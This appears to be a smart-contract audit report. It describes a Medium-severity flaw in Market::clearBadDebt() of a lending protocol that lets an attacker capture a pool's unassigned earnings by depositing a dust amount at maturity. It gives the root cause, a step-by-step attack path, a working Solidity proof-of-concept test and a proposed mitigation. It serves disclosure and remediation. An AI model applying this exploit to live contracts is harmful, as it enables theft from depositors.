Large Fuchsia Dove

Medium

# Liquidator will leave a pool with unassigned earnings on `Market::clearBadDebt()` free to claim for anyone when the repaid maturity is not the last

### Summary

This issue remains from the [last](https://github.com/sherlock-audit/2024-04-interest-rate-model-judging/issues/130) audit, only a partial fix was applied.

The issue is that in `Market::clearBadDebt()`, when a maturity is repaid, the unassigned earnings of this pool only go to the earnings accumulator when the last maturity is liquidated. However, if it's not the last maturity, the problem remains in case there is another borrowed maturity, and some user can claim these unassigned earnings just by supplying a few funds. Or if all `floatingBackupBorrowed` was due to the repaid maturity, and now it is 0, so users can borrow and deposit 1 wei to steal the unassigned earnings.

### Root Cause

In `Market:661`, the `earningsAccumulator is only increased [when](https://github.com/sherlock-audit/2024-07-exactly-stacking-contracts/blob/main/protocol/contracts/Market.sol#L652-L655) `fixedPools[maturity].borrowed == position.principal`. `position.principal` is always 0, as `fixedBorrowPositions[maturity][borrower]` has been deleted. Thus it will only assign the unassigned earnings when `fixedPools[maturity].borrowed` becomes null after a repayment. This means that as long as there are other borrowed maturities, the unassigned earnings may be stolen.

### Internal pre-conditions

1. Unassigned earnings must exist.
2. Debt of fixed borrows has to exceed user's collateral.

### External pre-conditions

None.

### Attack Path

1. Deposit funds to `Market` via `Market::deposit()` for the maturities to borrow, increasing `floatingBackupBorrow` and generating unassigned earnings.
2. 1 maturity is borrowed which will be liquidated.
3. At least 1 other maturity is borrowed so after liquidating the first, `fixedPools[maturity].borrowed` is not null.
4. Liquidate one of the maturities, so the unassigned earnings resulting from this maturity will not go to the `earningsAccumulator`.
5. Deposit at maturity to capture the unassigned earnings from both maturities, while only contributing liquidity to the other non liquidated one, which may be a dust amount, but the full unassigned earnings are captured to a single user.

### Impact

Attacker can claim a lot of unassigned earnings just by depositing at maturity enough (may be as small as 1 wei) to cover remaining `floatingBackupBorrowed`.

### PoC

Add the following POC to `Market.t.sol`, showing how a depositMaturity of 10 wei is enough to steal all unassigned maturities.
```solidity
function test_POC_ClearBadDebt_StealMaturities() external {
  uint256 maxVal = type(uint256).max;

  marketWETH.deposit(100000 ether, address(this));
  marketWETH.borrowAtMaturity(4 weeks, 10000e18, maxVal, address(this), address(this));
  marketWETH.repayAtMaturity(4 weeks, maxVal, maxVal, address(this));

  vm.startPrank(BOB);
  market.deposit(100 ether, BOB);
  auditor.enterMarket(market);
  marketWETH.borrowAtMaturity(4 weeks, 60e18, maxVal, BOB, BOB);
  vm.stopPrank();

  vm.startPrank(ALICE);
  weth.mint(ALICE, 1_000_000 ether);
  weth.approve(address(marketWETH), type(uint256).max);
  marketWETH.deposit(10, ALICE);
  marketWETH.borrowAtMaturity(4 weeks, 1, maxVal, ALICE, ALICE);
  vm.stopPrank();

  daiPriceFeed.setPrice(0.6e18);

  (uint256 coll, uint256 debt) = marketWETH.accountSnapshot(BOB);
  console.log(debt);
  (coll, debt) = market.accountSnapshot(BOB);
  console.log(coll);

  vm.startPrank(ALICE);
  marketWETH.liquidate(BOB, 100_000 ether, market);
  vm.stopPrank();

  (, , uint256 unassignedEarningsAfter, ) = marketWETH.fixedPools(4 weeks);
  assertEq(unassignedEarningsAfter, 45028532887479452);

  address attacker = makeAddr("attacker");
  vm.startPrank(attacker);
  deal(address(weth), attacker, 10);
  weth.approve(address(marketWETH), 10);
  marketWETH.depositAtMaturity(4 weeks, 10, 0, attacker);
  vm.stopPrank();

  (, , unassignedEarningsAfter, ) = marketWETH.fixedPools(4 weeks);
  assertEq(unassignedEarningsAfter, 0);

  // Attacker gets all the unassigned earnings by contributing only 10 
  (uint256 principal, uint256 fee) = marketWETH.fixedDepositPositions(4 weeks, attacker);
  assertEq(principal, 10);
  assertEq(fee, 40525679598731507);
}
```

### Mitigation

The unassigned earnings should be assigned to the earnings accumulator pro-rata to the `floatingBackupBorrowed` cleared in the bad debt clearance.